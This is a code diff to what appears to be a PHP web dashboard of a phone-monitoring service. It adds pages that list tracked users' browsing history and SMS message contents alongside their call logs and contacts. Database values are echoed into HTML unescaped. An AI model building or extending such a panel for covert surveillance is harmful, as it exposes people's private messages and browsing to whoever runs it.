@@ -187,9 +187,11 @@ $app->get('/placeconfig', function() use ($app){
         <header id="banner" class="body">
           <nav><ul>
             <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
             <li class="active"><a href="userscallslist">Call Logs</a></li>
             <li class="active"><a href="userscontactslist">Contacts List</a></li>
-            <li class="active"><a href="users">Users List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
             <li><a href="placeconfig">Place configure</a></li>
             <li><a href="logout">Logout</a></li>
           </ul></nav>
@@ -339,9 +341,11 @@ $app->get('/account', function() use ($app){
         <header id="banner" class="body">
           <nav><ul>
             <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
             <li class="active"><a href="userscallslist">Call Logs</a></li>
             <li class="active"><a href="userscontactslist">Contacts List</a></li>
-            <li class="active"><a href="users">Users List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
             <li><a href="placeconfig">Place configure</a></li>
             <li><a href="logout">Logout</a></li>
           </ul></nav>
@@ -454,9 +458,11 @@ $app->get('/users', function() use ($app){
         <header id="banner" class="body">
           <nav><ul>
             <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
             <li class="active"><a href="userscallslist">Call Logs</a></li>
             <li class="active"><a href="userscontactslist">Contacts List</a></li>
-            <li class="active"><a href="users">Users List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
             <li><a href="placeconfig">Place configure</a></li>
             <li><a href="logout">Logout</a></li>
           </ul></nav>
@@ -557,9 +563,11 @@ $app->get('/updateuser', function() use ($app){
         <header id="banner" class="body">
           <nav><ul>
             <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
             <li class="active"><a href="userscallslist">Call Logs</a></li>
             <li class="active"><a href="userscontactslist">Contacts List</a></li>
-            <li class="active"><a href="users">Users List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
             <li><a href="placeconfig">Place configure</a></li>
             <li><a href="logout">Logout</a></li>
           </ul></nav>
@@ -674,9 +682,11 @@ $app->get('/userscallslist', function() use ($app){
         <header id="banner" class="body">
           <nav><ul>
             <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
             <li class="active"><a href="userscallslist">Call Logs</a></li>
             <li class="active"><a href="userscontactslist">Contacts List</a></li>
-            <li class="active"><a href="users">Users List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
             <li><a href="placeconfig">Place configure</a></li>
             <li><a href="logout">Logout</a></li>
           </ul></nav>
@@ -751,6 +761,7 @@ $app->get('/callslist', function() use ($app){
     $rows = '';
     while($row = $result->fetch_assoc()){
         $rows .= '<tr>';
+        $rows .= '<td>'.$row['name'].'</td>';
         $rows .= '<td>'.$row['phone'].'</td>';
         $rows .= '<td>'.$row['type'].'</td>';
         $rows .= '<td>'.$row['calldate'].'</td>';
@@ -770,9 +781,11 @@ $app->get('/callslist', function() use ($app){
         <header id="banner" class="body">
           <nav><ul>
             <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
             <li class="active"><a href="userscallslist">Call Logs</a></li>
             <li class="active"><a href="userscontactslist">Contacts List</a></li>
-            <li class="active"><a href="users">Users List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
             <li><a href="placeconfig">Place configure</a></li>
             <li><a href="logout">Logout</a></li>
           </ul></nav>
@@ -788,6 +801,7 @@ $app->get('/callslist', function() use ($app){
                         <div class="col-xs-10">
                             <table style="width:100%">
                                 <tr>
+                                    <th>Name</th>
                                     <th>Phone</th> 
                                     <th>Call Type</th>
                                     <th>Call Date</th>
@@ -868,9 +882,11 @@ $app->get('/userscontactslist', function() use ($app){
         <header id="banner" class="body">
           <nav><ul>
             <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
             <li class="active"><a href="userscallslist">Call Logs</a></li>
             <li class="active"><a href="userscontactslist">Contacts List</a></li>
-            <li class="active"><a href="users">Users List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
             <li><a href="placeconfig">Place configure</a></li>
             <li><a href="logout">Logout</a></li>
           </ul></nav>
@@ -960,9 +976,11 @@ $app->get('/contactslist', function() use ($app){
         <header id="banner" class="body">
           <nav><ul>
             <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
             <li class="active"><a href="userscallslist">Call Logs</a></li>
             <li class="active"><a href="userscontactslist">Contacts List</a></li>
-            <li class="active"><a href="users">Users List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
             <li><a href="placeconfig">Place configure</a></li>
             <li><a href="logout">Logout</a></li>
           </ul></nav>
@@ -1012,6 +1030,400 @@ tr:nth-child(even) {
         echo $response;
     }
 });
+
+
+
+
+/* *
+ * URL: http://localhost/Monitor/cms/browserhistory
+ * Parameters: none
+ * Method: GET
+ * */
+$app->get('/browserhistory', function() use ($app){
+    $db = new DbOperation();
+    $result = $db->getAllUsers();
+    $id = '';
+    $name = '';
+    $phone = '';
+    $deviceId = '';
+    $deviceBrand = '';
+    $deviceModel = '';
+    $latitude = '';
+    $longitude = '';
+
+    session_start();
+    if(!isset($_SESSION["username"])){
+        header('Location: '.'/Monitor/cms/login');
+        die;
+    }else{
+    $rows = '';
+    while($row = $result->fetch_assoc()){
+        $rows .= '<tr>';
+        $rows .= '<td><a href=/Monitor/cms/browserhistorylist?id='.$row['id'].'>'.$row['name'].'</td>';
+        $rows .= '<td>'.$row['phone'].'</td>';
+        $rows .= '</tr>';
+    }
+    if ($rows=='') {
+        $rows="No users found";
+    }
+        $response = '<!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+            <link rel="stylesheet" href="css/custom.css">
+            <link rel="stylesheet" href="css/bootstrap.min.css">
+        </head>
+        <header id="banner" class="body">
+          <nav><ul>
+            <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
+            <li class="active"><a href="userscallslist">Call Logs</a></li>
+            <li class="active"><a href="userscontactslist">Contacts List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
+            <li><a href="placeconfig">Place configure</a></li>
+            <li><a href="logout">Logout</a></li>
+          </ul></nav>
+        </header><!-- /#banner -->
+        <body>
+            <form method ="post" action="">
+                <div class="container">
+                    <div class="intro-text">
+                        <h2>Browsing History List</h2>
+                        <p>All users registered. </p>
+                    </div>
+                    <div class="row">
+                        <div class="col-xs-1"></div>
+                        <div class="col-xs-10">
+                            <table style="width:100%">
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Phone</th> 
+                                </tr>'.$rows.'
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </body>
+        </html>
+        <style>
+table {
+    font-family: arial, sans-serif;
+    border-collapse: collapse;
+    width: 100%;
+}
+
+td, th {
+    border: 1px solid #dddddd;
+    text-align: left;
+    padding: 8px;
+}
+table, th, td {
+    border: 1px solid black;
+    border-collapse: collapse;
+}
+
+tr:nth-child(even) {
+    background-color: #dddddd;
+}
+</style>';
+        echo $response;
+    }
+});
+
+
+/* *
+ * URL: http://localhost/Monitor/cms/browserhistorylist
+ * Parameters: none
+ * Method: GET
+ * */
+$app->get('/browserhistorylist', function() use ($app){
+    $id = $app->request->get('id');
+    $db = new DbOperation();
+    $result = $db->getHistoryListById($id);
+    $title = '';
+    $url = '';
+
+    session_start();
+    if(!isset($_SESSION["username"])){
+        header('Location: '.'/Monitor/cms/login');
+        die;
+    }else{
+    $rows = '';
+    while($row = $result->fetch_assoc()){
+        $rows .= '<tr>';
+        $rows .= '<td>'.$row['title'].'</td>';
+        $rows .= '<td>'.$row['url'].'</td>';
+        $rows .= '</tr>';
+    }
+    if ($rows=='') {
+        $rows="No History found";
+    }
+        $response = '<!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+            <link rel="stylesheet" href="css/custom.css">
+            <link rel="stylesheet" href="css/bootstrap.min.css">
+        </head>
+        <header id="banner" class="body">
+          <nav><ul>
+            <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
+            <li class="active"><a href="userscallslist">Call Logs</a></li>
+            <li class="active"><a href="userscontactslist">Contacts List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
+            <li><a href="placeconfig">Place configure</a></li>
+            <li><a href="logout">Logout</a></li>
+          </ul></nav>
+        </header><!-- /#banner -->
+        <body>
+            <form method ="post" action="">
+                <div class="container">
+                    <div class="intro-text">
+                        <h2>Browsing History List</h2>
+                    </div>
+                    <div class="row">
+                        <div class="col-xs-1"></div>
+                        <div class="col-xs-10">
+                            <table style="width:100%">
+                                <tr>
+                                    <th>Page Title</th> 
+                                    <th>Page URL</th>
+                                </tr>'.$rows.'
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </body>
+        </html>
+        <style>
+table {
+    font-family: arial, sans-serif;
+    border-collapse: collapse;
+    width: 100%;
+}
+
+td, th {
+    border: 1px solid #dddddd;
+    text-align: left;
+    padding: 8px;
+}
+table, th, td {
+    border: 1px solid black;
+    border-collapse: collapse;
+}
+
+tr:nth-child(even) {
+    background-color: #dddddd;
+}
+</style>';
+        echo $response;
+    }
+});
+
+
+
+
+
+/* *
+ * URL: http://localhost/Monitor/cms/sms
+ * Parameters: none
+ * Method: GET
+ * */
+$app->get('/sms', function() use ($app){
+    $db = new DbOperation();
+    $result = $db->getAllUsers();
+    $id = '';
+    $name = '';
+    $phone = '';
+    $deviceId = '';
+    $deviceBrand = '';
+    $deviceModel = '';
+    $latitude = '';
+    $longitude = '';
+
+    session_start();
+    if(!isset($_SESSION["username"])){
+        header('Location: '.'/Monitor/cms/login');
+        die;
+    }else{
+    $rows = '';
+    while($row = $result->fetch_assoc()){
+        $rows .= '<tr>';
+        $rows .= '<td><a href=/Monitor/cms/smslist?id='.$row['id'].'>'.$row['name'].'</td>';
+        $rows .= '<td>'.$row['phone'].'</td>';
+        $rows .= '</tr>';
+    }
+    if ($rows=='') {
+        $rows="No users found";
+    }
+        $response = '<!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+            <link rel="stylesheet" href="css/custom.css">
+            <link rel="stylesheet" href="css/bootstrap.min.css">
+        </head>
+        <header id="banner" class="body">
+          <nav><ul>
+            <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
+            <li class="active"><a href="userscallslist">Call Logs</a></li>
+            <li class="active"><a href="userscontactslist">Contacts List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
+            <li><a href="placeconfig">Place configure</a></li>
+            <li><a href="logout">Logout</a></li>
+          </ul></nav>
+        </header><!-- /#banner -->
+        <body>
+            <form method ="post" action="">
+                <div class="container">
+                    <div class="intro-text">
+                        <h2>SMS List</h2>
+                        <p>All users registered. </p>
+                    </div>
+                    <div class="row">
+                        <div class="col-xs-1"></div>
+                        <div class="col-xs-10">
+                            <table style="width:100%">
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Phone</th> 
+                                </tr>'.$rows.'
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </body>
+        </html>
+        <style>
+table {
+    font-family: arial, sans-serif;
+    border-collapse: collapse;
+    width: 100%;
+}
+
+td, th {
+    border: 1px solid #dddddd;
+    text-align: left;
+    padding: 8px;
+}
+table, th, td {
+    border: 1px solid black;
+    border-collapse: collapse;
+}
+
+tr:nth-child(even) {
+    background-color: #dddddd;
+}
+</style>';
+        echo $response;
+    }
+});
+
+
+/* *
+ * URL: http://localhost/Monitor/cms/browserhistorylist
+ * Parameters: none
+ * Method: GET
+ * */
+$app->get('/smslist', function() use ($app){
+    $id = $app->request->get('id');
+    $db = new DbOperation();
+    $result = $db->getSmsListById($id);
+    $title = '';
+    $url = '';
+
+    session_start();
+    if(!isset($_SESSION["username"])){
+        header('Location: '.'/Monitor/cms/login');
+        die;
+    }else{
+    $rows = '';
+    while($row = $result->fetch_assoc()){
+        $rows .= '<tr>';
+        $rows .= '<td>'.$row['address'].'</td>';
+        $rows .= '<td>'.$row['message'].'</td>';
+        $rows .= '<td>'.$row['folder'].'</td>';
+        $rows .= '<td>'.$row['smsdate'].'</td>';
+        $rows .= '</tr>';
+    }
+    if ($rows=='') {
+        $rows="No SMS found";
+    }
+        $response = '<!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+            <link rel="stylesheet" href="css/custom.css">
+            <link rel="stylesheet" href="css/bootstrap.min.css">
+        </head>
+        <header id="banner" class="body">
+          <nav><ul>
+            <li><a href="account">Home</a></li>
+            <li class="active"><a href="users">All Users List</a></li>
+            <li class="active"><a href="browserhistory">Browsing History</a></li>
+            <li class="active"><a href="userscallslist">Call Logs</a></li>
+            <li class="active"><a href="userscontactslist">Contacts List</a></li>
+            <li class="active"><a href="sms">SMS List</a></li>
+            <li><a href="placeconfig">Place configure</a></li>
+            <li><a href="logout">Logout</a></li>
+          </ul></nav>
+        </header><!-- /#banner -->
+        <body>
+            <form method ="post" action="">
+                <div class="container">
+                    <div class="intro-text">
+                        <h2>SMS List</h2>
+                    </div>
+                    <div class="row">
+                        <div class="col-xs-1"></div>
+                        <div class="col-xs-10">
+                            <table style="width:100%">
+                                <tr>
+                                    <th>Sender / Receiver</th> 
+                                    <th>Message Content</th>
+                                    <th>Message Folder</th>
+                                    <th>Message Date</th>
+                                </tr>'.$rows.'
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </body>
+        </html>
+        <style>
+table {
+    font-family: arial, sans-serif;
+    border-collapse: collapse;
+    width: 100%;
+}
+
+td, th {
+    border: 1px solid #dddddd;
+    text-align: left;
+    padding: 8px;
+}
+table, th, td {
+    border: 1px solid black;
+    border-collapse: collapse;
+}
+
+tr:nth-child(even) {
+    background-color: #dddddd;
+}
+</style>';
+        echo $response;
+    }
+});
+
 
 function echoResponse($status_code, $response) {
     $app = \Slim\Slim::getInstance();
